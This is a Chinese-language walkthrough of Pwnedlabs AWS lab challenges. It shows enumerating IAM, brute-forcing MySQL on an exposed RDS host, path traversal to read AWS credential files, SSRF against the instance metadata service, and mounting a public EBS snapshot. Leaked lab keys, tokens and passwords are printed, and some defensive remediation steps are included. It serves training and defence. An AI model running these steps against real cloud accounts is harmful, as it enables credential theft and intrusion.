
Pwnedlabs靶场Writeup(上)

* * *

# Pwnedlabs

Pwnedlabs是一个关于AWS云安全的渗透靶场。靶场地址：[https://pwnedlabs.io/](https://pwnedlabs.io/)

## 1.Identify the AWS Account ID from a Public S3 Bucket

80端口里面可以找到存储桶但是没有东西。

列举aws的account id参考[https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/](https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/)

有一个 IAM 策略条件`s3:ResourceAccount`，旨在用于授予指定（一组）帐户中的 S3 访问权限，但也支持通配符。通过构建正确的模式，并查看哪些模式会导致拒绝或允许，我们可以通过一次发现一位数字来确定帐户 ID。

```plain
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```

## 2.Intro to AWS IAM Enumeration

环境可能会有一点卡。

```plain
#whoami
aws sts get-caller-identity

aws iam get-user
#枚举可能属于的所有组
aws iam list-groups-for-user --user-name dev01


#列出附加的用户策略
aws iam list-attached-user-policies --user-name dev01
#列出策略AmazonGuardDutyReadOnlyAccess的版本，--policy-arn从list-attached-user-policies中获得。Amazon 和客户管理的策略可以有多个版本，允许您保留、查看和回滚到以前的策略版本。内联策略不支持版本控制。
aws iam list-policy-versions --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess

#获得对应版本的policy
aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/AmazonGuardDutyReadOnlyAccess --version-id v3


#列出内联策略，AWS IAM 中的内联策略是直接嵌入到单个 IAM 用户、组或角色中的策略，并且不能单独管理或重复使用。
aws iam list-user-policies --user-name dev01
#获得内联策略
aws iam get-user-policy --user-name dev01 --policy-name S3_Access

#获取有关role的信息
aws iam get-role --role-name BackendDev
#获取附加的角色policy
aws iam list-attached-role-policies --role-name BackendDev
```

## 3.AWS S3 Enumeration Basics

网站的静态文件放在了一个存储桶中，匿名可读一些目录，从share目录下下载下来hl\_migration\_project.zip

```plain
aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip ./challenge3/hl_migration_project.zip --no-sign-request
```

解压后从里面读到了一个AKSK，configure后再次列admin目录，成功，但是不可读：

```plain
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./challenge3/flag.txt
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

查看一下存储桶的ACL：

```plain
aws s3api get-bucket-acl --bucket dev.huge-logistics.com
{
    "Owner": {
        "DisplayName": "content-images",
        "ID": "b715b8f6aac17232f38b04d8db4c14212de3228bbcaccd0a8e30bde9386755e0"
    },
    "Grants": [
        {
            "Grantee": {
                "DisplayName": "content-images",
                "ID": "b715b8f6aac17232f38b04d8db4c14212de3228bbcaccd0a8e30bde9386755e0",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

但是migration-files可访问且可读key了。

下载下来：

```plain
aws s3 cp s3://dev.huge-logistics.com/migration-files/test-export.xml ./challenge3/test-export.xml
```

里面存储了很多的用户名密码，也有aws it admin的用户名密码：

```plain
<?xml version="1.0" encoding="UTF-8"?>
<CredentialsExport>
    <!-- Oracle Database Credentials -->
    <CredentialEntry>
        <ServiceType>Oracle Database</ServiceType>
        <Hostname>oracle-db-server02.prod.hl-internal.com</Hostname>
        <Username>admin</Username>
        <Password>Password123!</Password>
        <Notes>Primary Oracle database for the financial application. Ensure strong password policy.</Notes>
    </CredentialEntry>
    <!-- HP Server Credentials -->
    <CredentialEntry>
        <ServiceType>HP Server Cluster</ServiceType>
        <Hostname>hp-cluster1.prod.hl-internal.com</Hostname>
        <Username>root</Username>
        <Password>RootPassword456!</Password>
        <Notes>HP server cluster for batch jobs. Periodically rotate this password.</Notes>
    </CredentialEntry>
    <!-- AWS Production Credentials -->
    <CredentialEntry>
        <ServiceType>AWS IT Admin</ServiceType>
        <AccountID>794929857501</AccountID>
        <AccessKeyID>AKIA3SFMDAPOQRFWFGCD</AccessKeyID>
        <SecretAccessKey>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</SecretAccessKey>
        <Notes>AWS credentials for production workloads. Do not share these keys outside of the organization.</Notes>
    </CredentialEntry>
    <!-- Iron Mountain Backup Portal -->
    <CredentialEntry>
        <ServiceType>Iron Mountain Backup</ServiceType>
        <URL>https://backupportal.ironmountain.com</URL>
        <Username>hladmin</Username>
        <Password>HLPassword789!</Password>
        <Notes>Account used to schedule tape collections and deliveries. Schedule regular password rotations.</Notes>
    </CredentialEntry>
    <!-- Office 365 Admin Account -->
    <CredentialEntry>
        <ServiceType>Office 365</ServiceType>
        <URL>https://admin.microsoft.com</URL>
        <Username>admin@company.onmicrosoft.com</Username>
        <Password>O365Password321!</Password>
        <Notes>Office 365 global admin account. Use for essential administrative tasks only and enable MFA.</Notes>
    </CredentialEntry>
    <!-- Jira Admin Account -->
    <CredentialEntry>
        <ServiceType>Jira</ServiceType>
        <URL>https://hugelogistics.atlassian.net</URL>
        <Username>jira_admin</Username>
        <Password>JiraPassword654!</Password>
        <Notes>Jira administrative account. Restrict access and consider using API tokens where possible.</Notes>
    </CredentialEntry>
</CredentialsExport>
```

配置好之后：

```plain
aws sts get-caller-identity
{
    "UserId": "AIDA3SFMDAPOWKM6ICH4K",
    "Account": "794929857501",
    "Arn": "arn:aws:iam::794929857501:user/it-admin"
}
```

再次下载，可以成功得到flag：

```plain
aws s3 cp s3://dev.huge-logistics.com/admin/flag.txt ./challenge3/flag.txt
```

## 4.Pillage Exposed RDS Instances

端口扫描：

```plain
sudo nmap -Pn -p3306,5432,1433,1521 exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 11:32 CST
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.0051s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
1521/tcp open  oracle
3306/tcp open  mysql
5432/tcp open  postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```

发现3306端口开了mysql后，尝试爆破用户名密码：

```plain
nmap -Pn -p3306 --script=mysql-brute --script-args brute.delay=10,brute.mode=creds,brute.credfile=mysql-creds.txt exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-21 14:06 CST
Nmap scan report for exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com (16.171.94.68)
Host is up (0.0013s latency).
rDNS record for 16.171.94.68: ec2-16-171-94-68.eu-north-1.compute.amazonaws.com

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts:
|     dbuser:123 - Valid credentials
|_  Statistics: Performed 1 guesses in 12 seconds, average tps: 0.1

Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
```

```plain
mysql -udbuser -p123 -h exposed.cw9ow1llpfvz.eu-north-1.rds.amazonaws.com
```

进入后读flag即可：

```plain
use user_info
select * from flag;
+----------------------------------+
| flag                             |
+----------------------------------+
| e1c342d58b6933b3e0b5078174fd5a62 |
+----------------------------------+
1 row in set (0.14 sec)
```

users表也泄漏了大量信息。

**防御：**

```plain
#列出rds实例
aws rds describe-db-instances

#列出可公开访问的rds的identifier
aws rds describe-db-instances --query 'DBInstances[*].PubliclyAccessible' --query 'DBInstances[*].DBInstanceIdentifier'
```

之后在控制台搜索公开访问的rds的identifier即可找到受影响的数据库，通过下面的步骤让数据库不可公开访问：

1.  单击页面右上角的“修改”，将弹出“修改数据库实例”页面。
2.  向下滚动到“连接”下的“其他连接配置”子部分并展开。
3.  选择“不可公开访问”以使 RDS 数据库实例私有。

## 5.Path Traversal to AWS credentials to S3

download功能能路径穿越导致的任意文件读取

尝试读取nedf用户下面的`/.aws/credentials`，读到了一个aksk：

[![](assets/1701606685-b0398f78b056db8eec4aec2062b57ed0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109135942-2cfcf232-7ec5-1.png)

```plain
aws sts get-caller-identity
{
    "UserId": "AIDATWVWNKAVDYBJBNBFC",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/nedf"
}
```

拿flag：`aws s3 cp s3://huge-logistics-bucket/flag.txt ./flag.txt`

这也说明了在云服务中，任意文件读取的攻击点也先看`/etc/passwd`看是否可能有云用户，以及它的`.aws`目录下面是否有aksk。

## 6.SSRF to Pwned

就是ssrf在云服务中的攻击。

网站中发现了存储桶，但是读不了flag：

```plain
aws s3 cp s3://huge-logistics-storage/backup/flag.txt ./flag2.txt --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden

feng at fengs-MacBook-Pro.local in [~/github/CTF/AWS/pwnedlabs/challenge6]  on git:main ✗  987e539c "commit"
15:04:38 › aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt ./cc-export2.txt --no-sign-request
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

`/status/status.php`是个ssrf，尝试读aksk：

```plain
http://hugelogistics.pwn/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/

http://hugelogistics.pwn/status/status.php?name=169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access
```

然后配置，即可还要配置token：

```plain
aws configure set aws_session_token IQoJb3JpZ2luX2VjEND//////////wEaCXVzLWVhc3QtMSJHMEUCIAHo0zQ56WW725f3mdJW0KpdHL50Pyg53pkgD8czJm4AAiEA/2/CACvaBEf3w5+UWy1KZm5LwMvg6qOdW0LW/P/MNBcqxAUI6P//////////ARAAGgwxMDQ1MDY0NDU2MDgiDCHcX0uE5O74z4vIESqYBXgqUARzReNhKJr1jnR43PIQzBqYpw8M1FOS6Qx4BrukCprBO2jHDuu13L5aC5hJ508mYWGDWP+NPIw5ufp8+3jcqOGrw5rxqeI50v0z6Hc9CHLBtL9hoZDv8qHs0H7DNoQhUAe9Y6mvHzsKE7nHgFT+Q0JT58kazwjCC4dYbRHFXclUwg6uML6hffV1RvRrDacYVXBd9qQhKdD9fMXz7SVDMxbOtbparYrBamkp3I6iEJ5+fSFFSZK2/mNMs+P0tTOBseJ8GnM/MKLJ4Lo2PtpGB/v0okrrLe1dKehRoSVkoweXQuOrt7XctJaNzHfm+OHT3qI/AmdFuGrgq4IHTtN3MYaaYxKwFv/rKX3WhcJl2hB7gguJFDXvwCM2NodbPyfYip2fl0y8lUHqu6je3A7dFH/cYTJ2nVqMWs8ZXooD/RuXddJ86sfGur/DOE9SQfEsCxHpcjllkb6RozmgJNoMaRPw98h2/sOePsQ2q4MXN7j6ZhC3Q+I1PrdTuoWYkbY1c8ePjntrEOBQlncJLjRYsqNmYHZbzbmBzugCuhtIOO9r6tg1Mss5mJYOGfdKStOj3XPIfhxaviySIgIcUpoez0XxLclivTNsuk4saAB4QCtSaRIm+vYahe9yqgb6lO6q7lbka2AtVEdvXSNKBFVvcbS4EW/jI4YEmDz8CjZIv8YyysP4sg1s4ojUUDeMaLU43dY0Qk4tob6QIA8pFYqw99rpLPl82az68A34d2pdQjPUpH3RnpPi8gLHHLO9eRpaWhR0HlytY4JdeosJriMLA4a34RRaENsWuBpSX/Qj5q2nnBHj/ANVpEj90SdIllio7vf0m7gHKT4kdJ3XtTvhxk+67enu95oQJ8LgqF/jtVCIRYie0aYwkvPNqQY6sQG4Q0KNc9l2ZkBJit+On6jmPUYyRLAfxQQBVoTdxGN3jxCVOpaVnQMoZnMhl8VvNCMdkQlWa4deuPCt+ocWsROYwYNDhCW0JCi2/vmJjcBv/ZeV0Dva6gyd488rfKOg7Zcy3+qBLkzLc07b0Et0i/GS1/AUyl/zdXKkwSDoZhB4BeMfkZksMSzFuh3bS6OREg9SJehxL2Eoc+NEkhz/yDdazi0x3PTofktNLBIFpmD4oqM=
```

```plain
aws sts get-caller-identity
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

再下载flag就有权限了：

```plain
aws s3 cp s3://huge-logistics-storage/backup/flag.txt ./flag.txt
```

**防御：**

创建新的 EC2 实例（使用 AWS 控制台显示）时，高级设置下有用于配置元数据服务各个方面的选项。单击`Info`“下一步”`Metadata accessible`将显示默认情况下可以访问元数据。这并不奇怪，因为实例元数据对于实现实例管理非常有用。单击`Info`“下一步”将`Metadata version`显示下面的文本。

**除非另有指定**，否则在创建 EC2 实例时默认情况下实例元数据服务的版本 1 和 2 仍然可用。AWS 实例元数据服务 (IMDSv1) 的第一版不需要身份验证。任何可以向[http://169.254.169.254/发出](http://169.254.169.254/%E5%8F%91%E5%87%BA) HTTP 请求的进程都可以访问该数据。2019 年第一资本数据泄露事件就是利用了这种缺乏身份验证的情况。

如果需要实例元数据，建议使用版本 2，因为这需要身份验证。

## 7.Loot Public EBS Snapshots

进行一些基本的信息收集

```plain
aws sts get-caller-identity
{
    "UserId": "AIDARQVIRZ4UJNTLTYGWU",
    "Account": "104506445608",
    "Arn": "arn:aws:iam::104506445608:user/intern"
}

aws iam list-attached-user-policies --user-name intern
{
    "AttachedPolicies": [
        {
            "PolicyName": "PublicSnapper",
            "PolicyArn": "arn:aws:iam::104506445608:policy/PublicSnapper"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper
{
    "Policy": {
        "PolicyName": "PublicSnapper",
        "PolicyId": "ANPARQVIRZ4UD6B2PNSLD",
        "Arn": "arn:aws:iam::104506445608:policy/PublicSnapper",
        "Path": "/",
        "DefaultVersionId": "v7",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-06-10T22:33:41+00:00",
        "UpdateDate": "2023-06-13T21:18:37+00:00",
        "Tags": []
    }
}

aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v7
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshotAttribute",
                    "Resource": "arn:aws:ec2:us-east-1::snapshot/snap-0c0679098c7a4e636"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeSnapshots",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:ListAttachedUserPolicies"
                    ],
                    "Resource": [
                        "arn:aws:iam::104506445608:user/intern",
                        "arn:aws:iam::104506445608:policy/PublicSnapper"
                    ]
                }
            ]
        },
        "VersionId": "v7",
        "IsDefaultVersion": true,
        "CreateDate": "2023-06-13T21:18:37+00:00"
    }
}
```

当前intern用户可以执行的操作是`DescribeSnapshotAttribute`和`DescribeSnapshots`

直接查看快照会显示特别多，查看一下属于当前用户的快照：

```plain
aws ec2 describe-snapshots --owner-ids 104506445608 --no-cli-pager
{
    "Snapshots": [
        {
            "Description": "Created by CreateImage(i-06d9095368adfe177) for ami-07c95fb3e41cb227c",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-0c0679098c7a4e636",
            "StartTime": "2023-06-12T15:20:20.580000+00:00",
            "State": "completed",
            "VolumeId": "vol-0ac1d3295a12e424b",
            "VolumeSize": 8,
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "PublicSnapper"
                }
            ],
            "StorageTier": "standard"
        },
        {
            "Description": "Created by CreateImage(i-0199bf97fb9d996f1) for ami-0e411723434b23d13",
            "Encrypted": false,
            "OwnerId": "104506445608",
            "Progress": "100%",
            "SnapshotId": "snap-035930ba8382ddb15",
            "StartTime": "2023-08-24T19:30:49.742000+00:00",
            "State": "completed",
            "VolumeId": "vol-09149587639d7b804",
            "VolumeSize": 24,
            "StorageTier": "standard"
        }
    ]
}
```

第二个快照没法查看属性会报奇怪的错，但是可以看第一个快照的：

```plain
aws ec2 describe-snapshot-attribute --snapshot-id snap-0c0679098c7a4e636 --attribute createVolumePermission --no-cli-pager
{
    "CreateVolumePermissions": [
        {
            "Group": "all"
        }
    ],
    "SnapshotId": "snap-0c0679098c7a4e636"
}
```

说明这个快照是公有的，所有人都可以根据这个快照创建卷。

接下来的思路就是根据这个公有快照创建卷，可用区选择和自己的 EC2 一样的，快照 ID 指定刚才随便找的快照。之后挂载卷attach volume，挂载成功后：

```plain
sudo fdisk -l
sudo mkdir /test
sudo mount /dev/xvdf3 /test
sudo ls /test
```

随后在home的下面可以找到s3\_download\_file.php：

[![](assets/1701606685-ed5f743f84c21ace8c274a0eeac746f7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231109140112-6296b8ce-7ec5-1.png)

```plain
AKIARQVIRZ4UDSDT72VT

weAlWiW405rY1BGIjLvIf+pDUvxxo6DByf8K3+CN

ecorp-client-data
```

可以直接读flag，还泄漏了一些信息：

```plain
aws s3 ls s3://ecorp-client-data
2023-06-13 04:32:59       3473 ecorp_dr_logistics.csv
2023-06-13 04:33:00         32 flag.txt
2023-06-12 23:04:25          7 test.csv
```

**防御：**

问题就在于那个公有快照，应该将其修改为私有。

下面的命令可以快速检测公开快照：

```plain
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate
```

如果您发现您的 AWS 账户中的未加密快照已被公开暴露，您可以：

*   设为私有
*   轮换(Rotate，不好翻译)其上的所有凭据
*   调查它是如何被公开曝光的

## 8.Assume Privileged Role with External ID

网站存在一个config.json：

```plain
{"aws": {
        "accessKeyID": "AKIAWHEOTHRFYM6CAHHG",
        "secretAccessKey": "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",
        "region": "us-east-1",
        "bucket": "hl-data-download",
        "endpoint": "https://s3.amazonaws.com"
    },
    "serverSettings": {
        "port": 443,
        "timeout": 18000000
    },
    "oauthSettings": {
        "authorizationURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/authorize",
        "tokenURL": "https://auth.hugelogistics.com/ms_oauth/oauth2/endpoints/oauthservice/tokens",
        "clientID": "1012aBcD3456EfGh",
        "clientSecret": "aZ2x9bY4cV6wL8kP0sT7zQ5oR3uH6j",
        "callbackURL": "https://portal.huge-logistics/callback",
        "userProfileURL": "https://portal.huge-logistics.com/ms_oauth/resources/userprofile/me"
    }
}
```

配置上去：

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRF7MLFMRGYH",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/data-bot"
}
```

列举一下当前的权限：

```plain
python3.10 enumerate-iam.py --access-key AKIAWHEOTHRFYM6CAHHG --secret-key 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


2023-10-21 20:12:47,354 - 11365 - [INFO] -- secretsmanager.list_secrets() worked!
```

看一下list\_secrets:

```plain
aws secretsmanager list-secrets --no-cli-pager
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-13T02:15:38.909000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "41a82b5b-fb44-4ab3-8811-7ea171e9d3c1": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-07-13T02:14:35.740000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-rpkQvl",
            "Name": "employee-database",
            "Description": "Access to MySQL employee database",
            "RotationEnabled": true,
            "RotationLambdaARN": "arn:aws:lambda:us-east-1:427648302155:function:SecretsManagermysql-rotation",
            "RotationRules": {
                "AutomaticallyAfterDays": 7,
                "ScheduleExpression": "cron(0 0 ? * 2 *)"
            },
            "LastRotatedDate": "2023-10-16T15:18:02.417000+08:00",
            "LastChangedDate": "2023-10-16T15:18:02.369000+08:00",
            "LastAccessedDate": "2023-10-16T08:00:00+08:00",
            "NextRotationDate": "2023-10-24T07:59:59+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "2bb80579-4b3e-4319-8d74-3bca18a404a5": [
                    "AWSPREVIOUS"
                ],
                "388b154d-87b8-4c69-901b-9902484d22da": [
                    "AWSCURRENT",
                    "AWSPENDING"
                ]
            },
            "CreatedDate": "2023-07-13T02:15:02.970000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
            "Name": "ext/cost-optimization",
            "Description": "Allow external partner to access cost optimization user and Huge Logistics resources",
            "LastChangedDate": "2023-08-07T04:10:16.392000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f7d6ae91-5afd-4a53-93b9-92ee74d8469c": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T05:19:28.466000+08:00"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK",
            "Name": "billing/hl-default-payment",
            "Description": "Access to the default payment card for Huge Logistics",
            "LastChangedDate": "2023-08-05T06:33:39.872000+08:00",
            "LastAccessedDate": "2023-10-19T08:00:00+08:00",
            "Tags": [],
            "SecretVersionsToStages": {
                "f8e592ca-4d8a-4a85-b7fa-7059539192c5": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-08-05T06:33:39.828000+08:00"
        }
    ]
}
```

尝试`get-secret-value`，只有`arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4`可以得到secret：

```plain
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4 --no-cli-pager
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOurCostsOptimized!!!!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-05T05:19:28.512000+08:00"
}
```

得到ext-cost-user:K33pOurCostsOptimized!!!!。

利用用户名密码登录aws控制台，id要输一开始拿到的aksk账号的id。

进入之后在aws cloudshell里拿到可用的aksk：

```plain
[cloudshell-user@ip-10-2-48-155 ~]$ aws configure export-credentials
{
  "Version": 1,
  "AccessKeyId": "ASIAWHEOTHRFSGSZQD7U",
  "SecretAccessKey": "g1r4/6M/8uPaaSFxwLtQQmGHNWTWacAyqexICQTN",
  "SessionToken": "IQoJb3JpZ2luX2VjENX//////////wEaCXVzLWVhc3QtMSJIMEYCIQDxZd2EjyqrmNoWubEysJcHtEeCLy+HG3JvFiNnccZNmAIhAKxnmydJNSat8bNrxGKkxWCVNlyza3TbctKCZKOOMCTyKpEDCO7//////////wEQABoMNDI3NjQ4MzAyMTU1IgzKYnvtS4qgMpoJDl0q5QJRUOYIe7cFXdl1hhAxI4Nl02fEERg0Bl/Qh5ANZuTUVNzfrwii6H0nEGwVFNBkkKj4FeWna0M7AUNEXSuEJb4nvHZYSlBMQhhuDGgRb+qCta9wS2ut/oGwE4mxCBVBFNlHgY8Zw/Tx6citymqkaTeAhmtqA67eaktvJc86HOJlAGnGVWXJYeysiTDCnFzWWagqw6bslvyvvE1qxibTHZ3g1jp1KhCHarbrY0Ehw3VfaGTQx7xTTnyNTs+srvMuvRuGCGP4zo8o33Q674K7EVQXXTUgX8nAx3G7Sk1VJ9+7EKPWZIvQqQDlohYSnNMJvLfwQZraGW2w17CggMqfmEq8PTiA8Ghw6zHUj5oHo6VXHLP7NT2fF3xnWyDoZNcWxsTTNDS8tn5udF9qK18MOdphyJy5O9DSK/UdlJCt0ZK7Dfq5gEIpVQQZYDPJEv0Yuv3xOyCYilxmXvF1RQuR8d+zL9bCLd4wjYrPqQY6sgI7fXfK5+m5QhHWmsJGqOxoCt6PUso1zMi+RgfUQ7HGRDe4vSXmJUzhfon8PAGJHmo7+OelPz+1lwqE/HyJQ4lxZw2VaVS2vVlAjoL2fmWHq/2hScgrVqc98D9YrOKG0X+pehxBlDI7PEwkDjMlLG9b5T48w14JjCprlKJf4MHDa2Y9+uwbYAHUtYvYx5zS4fKhVLjetXmKQ9m8QsSCwcGNFoxQWXjyQRFLhget6I1UkLDAtv+qKM4uLPjw6Q84IE4s1HnffpfrKz4JkXW+aF5VU1DISUCWZ+lCAhRUzBW38BHkmlu7saBcfWPpOVOZlMgjOoQ9tfR2ji94feR6x2a1SjzUFHxHxP8SEJKycWZBopitj6GzKIHGlWm8amUU8raBH7Pswf9KSZKj4AgYe0a/S4A=",
  "Expiration": "2023-10-21T12:49:50+00:00"
}
```

接下来的一系列操作就是简单的权限枚举，但是需要了解其现实的意义。

```plain
aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AIDAWHEOTHRFTNCWM7FHT",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/ext-cost-user"
}

aws iam list-attached-user-policies --user-name ext-cost-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}

aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --no-cli-pager
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26+00:00",
        "UpdateDate": "2023-08-06T20:23:42+00:00",
        "Tags": []
    }
}


#这显示了当前用户的一些权限
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}

#这说明了当前用户可以assume-role得到ExternalCostOpimizeAccess的临时权限
aws iam get-role --role-name ExternalCostOpimizeAccess --no-cli-pager
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
        },
        "Description": "Allow trusted AWS cost optimization partner to access Huge Logistics resources",
        "MaxSessionDuration": 3600,
        "RoleLastUsed": {
            "LastUsedDate": "2023-10-19T17:13:04+00:00",
            "Region": "us-east-1"
        }
    }
}

aws iam list-attached-role-policies --role-name ExternalCostOpimizeAccess  --no-cli-pager
{
    "AttachedPolicies": [
        {
            "PolicyName": "Payment",
            "PolicyArn": "arn:aws:iam::427648302155:policy/Payment"
        }
    ]
}


aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/Payment --no-cli-pager
{
    "Policy": {
        "PolicyName": "Payment",
        "PolicyId": "ANPAWHEOTHRFZCZIMJSVW",
        "Arn": "arn:aws:iam::427648302155:policy/Payment",
        "Path": "/",
        "DefaultVersionId": "v2",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T22:03:41+00:00",
        "UpdateDate": "2023-08-04T22:34:19+00:00",
        "Tags": []
    }
}


#看一下ExternalCostOpimizeAccess用户的policy，发现其可以GetSecretValue。现实的意义可能是ExternalCostOpimizeAccess用户可以访问公司账单中的payment信息
aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Payment --version-id v2 --no-cli-pager
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "secretsmanager:GetSecretValue",
                        "secretsmanager:DescribeSecret",
                        "secretsmanager:ListSecretVersionIds"
                    ],
                    "Resource": "arn:aws:secretsmanager:us-east-1:427648302155:secret:billing/hl-default-payment-xGmMhK"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "secretsmanager:ListSecrets",
                    "Resource": "*"
                }
            ]
        },
        "VersionId": "v2",
